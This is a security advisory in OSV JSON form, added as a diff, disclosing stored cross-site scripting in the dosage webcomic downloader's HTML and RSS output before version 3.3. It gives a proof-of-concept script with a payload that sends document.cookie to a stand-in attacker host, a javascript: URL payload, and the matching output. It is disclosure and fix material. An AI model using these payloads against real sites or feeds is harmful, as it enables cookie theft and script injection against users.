@@ -1,0 +1,75 @@
+{
+  "id": "GHSA-75mw-h36v-2jv7",
+  "modified": "2026-06-26T21:15:08.360469281Z",
+  "published": "2026-06-26T21:03:43Z",
+  "summary": "Dosage Vulnerable to Stored Cross-Site Scripting (XSS) in HTML/RSS Output Handlers",
+  "details": "## Summary\n\nThe HTML and RSS output handlers in `dosagelib/events.py` write user-controlled content (comic text and page URLs) directly into generated files without proper HTML escaping. When a user scrapes a malicious webcomic and opens the generated HTML/RSS file, attacker-controlled JavaScript can execute in their browser.\n\n**CWE**: [CWE-79](https://cwe.mitre.org/data/definitions/79.html) - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)\n\n---\n\n## Details\n\n### Vulnerable Code Locations\n\nThe vulnerability exists in `dosagelib/events.py` where untrusted content is written to HTML/RSS output without escaping:\n\n**1. RSSEventHandler (lines 116-118)**\n```python\n# events.py:116-118\nif comic.text:\n    description += '\u003cbr/\u003e%s' % comic.text        # ← Unescaped comic.text\ndescription += '\u003cbr/\u003e\u003ca href=\"%s\"\u003eView Comic Online\u003c/a\u003e' % pageUrl  # ← Unescaped URL\n```\n\n**2. HtmlEventHandler (lines 232, 238)**\n```python\n# events.py:232\nself.html.write(u'\u003cli\u003e\u003ca href=\"%s\"\u003e%s\u003c/a\u003e\\n' % (pageUrl, pageUrl))  # ← Unescaped URL\n\n# events.py:238\nif text:\n    self.html.write(u'\u003cbr/\u003e%s\\n' % text)  # ← Unescaped text\n```\n\n### Root Cause\n\n- `BasicScraper.fetchText()` in `scraper.py:422` calls `html.unescape()` on extracted text\n- The output handlers never call `html.escape()` before writing to files\n- No sanitization of URLs or text content occurs anywhere in the output pipeline\n\n### Data Flow\n\n```\nMalicious webcomic page\n    ↓\ntextSearch XPath extracts content (e.g., img/@title, div text)\n    ↓\nBasicScraper.fetchText() calls html.unescape()\n    ↓\ncomic.text stored without sanitization\n    ↓\nHtmlEventHandler/RSSEventHandler writes to file without html.escape()\n    ↓\nGenerated HTML/RSS contains executable JavaScript\n```\n\n---\n\n## PoC\n\nI created a proof-of-concept that demonstrates the vulnerability by simulating a malicious comic source.\n\n### Prerequisites\n- Docker installed and running\n\n### PoC Files\n\nCreate these files in a `poc/` directory:\n\n**1. `poc/Dockerfile`**\n```dockerfile\nFROM python:3.11-slim\n\nLABEL description=\"PoC for dosage Stored XSS vulnerability (CWE-79)\"\n\nWORKDIR /app\nCOPY . /app\n\n# Install dependencies\nRUN pip install --no-cache-dir --quiet imagesize lxml requests rich platformdirs\n\n# Install dosage\nENV SETUPTOOLS_SCM_PRETEND_VERSION_FOR_DOSAGE=0.0.0\nRUN pip install --no-cache-dir --quiet .\n\nCMD [\"python\", \"poc/poc.py\"]\n```\n\n**2. `poc/poc.py`**\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: Stored XSS in dosage HTML/RSS Output Handlers\nDemonstrates that untrusted comic content is written to output files unescaped.\n\"\"\"\n\nimport sys\nfrom pathlib import Path\nfrom types import SimpleNamespace\n\nfrom dosagelib.events import HtmlEventHandler, RSSEventHandler\n\n# XSS payloads simulating malicious webcomic content\nMALICIOUS_TEXT = \"Funny Comic!\u003cscript\u003efetch('http://attacker.com/?c='+document.cookie)\u003c/script\u003e\"\nMALICIOUS_URL = \"javascript:alert('XSS-via-URL')\"\n\ndef check_vulnerability(content: str, marker: str, description: str) -\u003e bool:\n    \"\"\"Check if unescaped marker appears in content.\"\"\"\n    if marker.lower() in content.lower():\n        print(f\"  [VULNERABLE] {description}\")\n        print(f\"               Found unescaped: {marker}\")\n        return True\n    print(f\"  [SAFE] {description}\")\n    return False\n\ndef main():\n    print(\"=\" * 70)\n    print(\"PoC: Stored XSS in dosage HTML/RSS Output Handlers\")\n    print(\"=\" * 70)\n    print()\n\n    base = Path(__file__).parent / \"output\"\n    base.mkdir(parents=True, exist_ok=True)\n\n    # Create dummy image file\n    img_path = base / \"payload.png\"\n    img_path.write_bytes(b\"\\x89PNG\\r\\n\\x1a\\n\")\n\n    # Simulate comic with malicious content\n    comic = SimpleNamespace(\n        scraper=SimpleNamespace(name=\"MaliciousComic\"),\n        referrer=MALICIOUS_URL,\n        text=MALICIOUS_TEXT,\n        url=\"http://example.com/comic.png\"\n    )\n\n    vulnerabilities_found = 0\n\n    # Test RSS Handler\n    print(\"[*] Testing RSSEventHandler...\")\n    rss_handler = RSSEventHandler(str(base), None, False)\n    rss_handler.start()\n    rss_handler.comicDownloaded(comic, str(img_path))\n    rss_handler.end()\n    \n    rss_path = Path(rss_handler.rssfn)\n    rss_content = rss_path.read_text(encoding=\"utf-8\")\n    print(f\"    Output file: {rss_path}\")\n    \n    if check_vulnerability(rss_content, \"javascript:\", \"pageUrl in RSS href\"):\n        vulnerabilities_found += 1\n\n    # Test HTML Handler  \n    print()\n    print(\"[*] Testing HtmlEventHandler...\")\n    html_handler = HtmlEventHandler(str(base), None, False)\n    html_handler.start()\n    html_path = Path(html_handler.html.name)\n    html_handler.comicDownloaded(comic, str(img_path), text=MALICIOUS_TEXT)\n    html_handler.end()\n\n    html_content = html_path.read_text(encoding=\"utf-8\")\n    print(f\"    Output file: {html_path}\")\n    \n    if check_vulnerability(html_content, \"\u003cscript\u003e\", \"text param in HTML\"):\n        vulnerabilities_found += 1\n    if check_vulnerability(html_content, \"javascript:\", \"pageUrl in HTML link\"):\n        vulnerabilities_found += 1\n\n    # Show vulnerable content\n    print()\n    print(\"-\" * 70)\n    print(\"Vulnerable Content in Generated HTML:\")\n    print(\"-\" * 70)\n    for line in html_content.splitlines():\n        if \"\u003cscript\u003e\" in line.lower() or \"javascript:\" in line.lower():\n            print(f\"  {line}\")\n\n    print()\n    print(\"=\" * 70)\n    print(f\"RESULT: {vulnerabilities_found} XSS vulnerability vectors confirmed!\")\n    print(\"=\" * 70)\n    \n    return 0 if vulnerabilities_found \u003e 0 else 1\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\n**3. `poc/run_poc.sh`**\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" \u0026\u0026 pwd)\"\nROOT_DIR=\"$(cd \"${SCRIPT_DIR}/..\" \u0026\u0026 pwd)\"\n\necho \"[*] Building PoC Docker image...\"\ndocker build -t dosage-xss-poc -f \"${SCRIPT_DIR}/Dockerfile\" \"${ROOT_DIR}\" --quiet\n\necho \"[*] Running PoC...\"\ndocker run --rm dosage-xss-poc\n\necho \"[*] Cleanup: docker rmi dosage-xss-poc\"\n```\n\n### Running the PoC\n\n```bash\ncd /path/to/dosage\nchmod +x poc/run_poc.sh\n./poc/run_poc.sh\n```\n\n### PoC Output\n\n```\n======================================================================\nPoC: Stored XSS in dosage HTML/RSS Output Handlers\n======================================================================\n\n[*] Testing RSSEventHandler...\n    Output file: /app/poc/output/dailydose.rss\n  [VULNERABLE] pageUrl in RSS href\n               Found unescaped: javascript:\n\n[*] Testing HtmlEventHandler...\n    Output file: /app/poc/output/html/comics-20251210.html\n  [VULNERABLE] text param in HTML\n               Found unescaped: \u003cscript\u003e\n  [VULNERABLE] pageUrl in HTML link\n               Found unescaped: javascript:\n\n----------------------------------------------------------------------\nVulnerable Content in Generated HTML:\n----------------------------------------------------------------------\n  \u003cli\u003e\u003ca href=\"javascript:alert('XSS-via-URL')\"\u003ejavascript:alert('XSS-via-URL')\u003c/a\u003e\n  \u003cbr/\u003eFunny Comic!\u003cscript\u003efetch('http://attacker.com/?c='+document.cookie)\u003c/script\u003e\n\n======================================================================\nRESULT: 3 XSS vulnerability vectors confirmed!\n======================================================================\n```\n\nThe output shows that:\n1. The `javascript:` URL is written directly into `\u003ca href\u003e` attributes\n2. The `\u003cscript\u003e` tag from comic text appears unescaped in the HTML body\n\n---\n\n## Impact\n\n### Who is affected?\n- Users who use `dosage --output html` or `dosage --output rss` options\n- Anyone who opens the generated HTML/RSS files in a browser\n\n### Attack scenario\n1. Attacker creates or compromises a webcomic site\n2. Attacker injects JavaScript into image title/alt attributes:\n   ```html\n   \u003cimg src=\"comic.png\" title=\"Funny!\u003cscript\u003ealert(1)\u003c/script\u003e\"\u003e\n   ```\n3. Victim runs: `dosage MaliciousComic --output html`\n4. The generated `Comics/html/comics-YYYYMMDD.html` contains the unescaped script\n5. When victim opens the file, JavaScript executes\n\n### Potential consequences\n- **Cookie theft** if files are served over HTTP\n- **Local file access** via `file://` protocol\n- **Phishing attacks** through DOM manipulation\n\n---\n\n## Recommended Fix\n\nEscape all user-controlled content before writing to HTML/RSS:\n\n```python\nimport html\n\n# In RSSEventHandler.comicDownloaded() - events.py around line 116:\nif comic.text:\n    description += '\u003cbr/\u003e%s' % html.escape(comic.text)\ndescription += '\u003cbr/\u003e\u003ca href=\"%s\"\u003eView Comic Online\u003c/a\u003e' % html.escape(pageUrl)\n\n# In HtmlEventHandler.comicDownloaded() - events.py around line 232:\nself.html.write(u'\u003cli\u003e\u003ca href=\"%s\"\u003e%s\u003c/a\u003e\\n' % (html.escape(pageUrl), html.escape(pageUrl)))\n\n# events.py around line 238:\nif text:\n    self.html.write(u'\u003cbr/\u003e%s\\n' % html.escape(text))\n```\n\nFor URLs, validating that they use safe protocols (`http://`, `https://`) would also help prevent javascript: URLs.\n\n---\n\n## Resources\n\n- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)\n- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [Python html.escape() documentation](https://docs.python.org/3/library/html.html#html.escape)\n\n---",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "dosage",
+        "purl": "pkg:pypi/dosage"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.10",
+        "1.11",
+        "1.12",
+        "1.13",
+        "1.14",
+        "1.15",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0",
+        "2.1",
+        "2.10",
+        "2.11",
+        "2.12",
+        "2.13",
+        "2.14",
+        "2.15",
+        "2.16",
+        "2.17",
+        "2.2",
+        "2.3",
+        "2.4",
+        "2.5",
+        "2.6",
+        "2.7",
+        "2.8",
+        "2.9",
+        "3.0",
+        "3.1",
+        "3.2"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-75mw-h36v-2jv7/GHSA-75mw-h36v-2jv7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/webcomics/dosage/security/advisories/GHSA-75mw-h36v-2jv7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/webcomics/dosage"
+    }
+  ]
+}
